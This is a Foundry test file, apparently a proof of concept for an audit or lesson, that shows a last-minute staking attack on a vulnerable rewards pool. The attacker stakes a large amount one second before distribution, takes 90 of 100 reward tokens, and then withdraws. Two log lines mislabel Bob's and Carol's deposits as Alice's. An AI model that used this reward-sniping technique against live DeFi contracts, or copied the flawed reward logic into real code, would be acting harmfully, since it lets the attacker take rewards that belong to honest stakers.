
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import "src/StakingRewardDistribution1.sol";

contract MockToken is ERC20 {
    constructor(string memory name_, string memory symbol_)
        ERC20(name_, symbol_)
    {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}


contract StakingRewardsVuln1Test is Test {
    MockToken stakeToken;
    MockToken rewardToken;
    StakingRewardsVuln1 pool;

    address alice = address(0xA1);
    address bob = address(0xB1);
    address carol = address(0xC1);
    address hacker = address(0x1337);

    uint256 constant ALICE_STAKE = 400 ether;
    uint256 constant BOB_STAKE = 300 ether;
    uint256 constant CAROL_STAKE = 300 ether;
    uint256 constant HACKER_STAKE = 9_000 ether;
    uint256 constant REWARDS_AMOUNT = 100 ether; // In reward Tokens

    function setUp() public {
        stakeToken = new MockToken("Stake Token", "sTKN");
        rewardToken = new MockToken("Reward Token", "RWD");

        // The test contract is the rewarder.
        pool = new StakingRewardsVuln1(
            address(stakeToken),
            address(rewardToken)
        );

        // The users have funds to stake
        stakeToken.mint(alice, ALICE_STAKE);
        stakeToken.mint(bob, BOB_STAKE);
        stakeToken.mint(carol, CAROL_STAKE);
        // The hacker too
        stakeToken.mint(hacker, HACKER_STAKE);

        // The rewarder has 100 RWD
        rewardToken.mint(address(this), REWARDS_AMOUNT);

        vm.prank(alice);
        stakeToken.approve(address(pool), type(uint256).max);

        vm.prank(bob);
        stakeToken.approve(address(pool), type(uint256).max);

        vm.prank(carol);
        stakeToken.approve(address(pool), type(uint256).max);

        vm.prank(hacker);
        stakeToken.approve(address(pool), type(uint256).max);
        rewardToken.approve(address(pool), type(uint256).max);


        // Honest users stake their funds first
        vm.prank(alice);
        pool.stake(ALICE_STAKE);

        vm.prank(bob);
        pool.stake(BOB_STAKE);

        vm.prank(carol);
        pool.stake(CAROL_STAKE);

        // A quick check that everyone staked
        assertEq(pool.totalSupply(), 1_000 ether);
        assertEq(pool.balanceOf(alice), ALICE_STAKE);
        assertEq(pool.balanceOf(bob), BOB_STAKE);
        assertEq(pool.balanceOf(carol), CAROL_STAKE);
    }


    function testThreeHonestUsersLoseRewardsToLastMinuteFrontRunner() public {
        // Honest users have been staking for six months.
        vm.warp(block.timestamp + 180 days);

        // Hacker stakes immediately before distribution
        uint256 hackerStakeTime = block.timestamp;

        vm.prank(hacker);
        pool.stake(HACKER_STAKE);

        assertEq(pool.totalSupply(), 10_000 ether);

        // The reward distributed 1 second later
        vm.warp(hackerStakeTime + 1);

        pool.distributeReward(REWARDS_AMOUNT);

        // 100 RWD / 10,000 sTKN = 0.01 RWD per sTKN
        assertEq(pool.rewardPerShare(), 1e16);

        // Check each user's pending rewards before claiming.
        assertEq(pool.pendingReward(alice), 4 ether);
        assertEq(pool.pendingReward(bob), 3 ether);
        assertEq(pool.pendingReward(carol), 3 ether);
        assertEq(pool.pendingReward(hacker), 90 ether);

        // Hacker unstakes and automatically claims the reward
        uint256 hackerRewardsBefore = rewardToken.balanceOf(hacker);

        vm.prank(hacker);
        pool.unstake(HACKER_STAKE);

        uint256 hackerRewardsAfter = rewardToken.balanceOf(hacker) - hackerRewardsBefore;

        assertEq(hackerRewardsAfter, 90 ether);
        assertEq(pool.claimedRewards(hacker), 90 ether);

        // Attacker recovers all original staking tokens.
        assertEq(pool.balanceOf(hacker), 0);
        assertEq(stakeToken.balanceOf(hacker), HACKER_STAKE);

        // Honest users claim their rewards
        vm.prank(alice);
        pool.claimReward();

        vm.prank(bob);
        pool.claimReward();
        
        vm.prank(carol);
        pool.claimReward();

        assertEq(pool.claimedRewards(alice), 4 ether);
        assertEq(pool.claimedRewards(bob), 3 ether);
        assertEq(pool.claimedRewards(carol), 3 ether);

        // Total claimed rewards must equal the distribution
        assertEq(
            pool.claimedRewards(alice)
            + pool.claimedRewards(bob)
            + pool.claimedRewards(carol)
            + pool.claimedRewards(hacker),
        REWARDS_AMOUNT
        );

        // ==========================================
        // PRINT RESULTS
        // Amounts are displayed in whole tokens.
        // ==========================================

        console.log("");
        console.log("========== STAKING DEPOSITS (sTKN) ==========");

        emit log_named_uint("Alice deposited", ALICE_STAKE / 1e18);
        emit log_named_uint("Alice deposited", BOB_STAKE / 1e18);
        emit log_named_uint("Alice deposited", CAROL_STAKE / 1e18);

        emit log_named_uint("Total honest deposits: ", (ALICE_STAKE + BOB_STAKE + CAROL_STAKE) / 1e18);

        emit log_named_uint("Hacker deposited: ", HACKER_STAKE / 1e18);

        emit log_named_uint("Total stake before distribution", pool.totalSupply() / 1e18);

        console.log("");
        console.log("========== EXPECTED REWARDS (RWD) ==========");
        console.log("Baseline: distribution without the attacker");

        emit log_named_uint("Alice should receive:", 40);
        emit log_named_uint("Bob should receive:, ", 30);
        emit log_named_uint("Carol should receive:, ", 30);
        emit log_named_uint("Hacker should receive:", 0);

        console.log("");
        console.log("========== ACTUAL REWARDS (RWD) ==========");

        emit log_named_uint("Alice received:", pool.claimedRewards(alice) / 1e18);

        emit log_named_uint("Bob received:", pool.claimedRewards(bob) / 1e18);

        emit log_named_uint("Carol received:", pool.claimedRewards(carol) / 1e18);

        emit log_named_uint("Hacker received:", pool.claimedRewards(hacker) / 1e18);



        console.log("");
        console.log("========== HONEST USERS' REWARD LOSS (RWD) ==========");

        emit log_named_uint("Alice lost:", 40 - pool.claimedRewards(alice) / 1e18);

        emit log_named_uint("Bob lost:", 30 - pool.claimedRewards(bob) / 1e18);

        emit log_named_uint("Carol lost:", 30 - pool.claimedRewards(carol) / 1e18);

    }
}
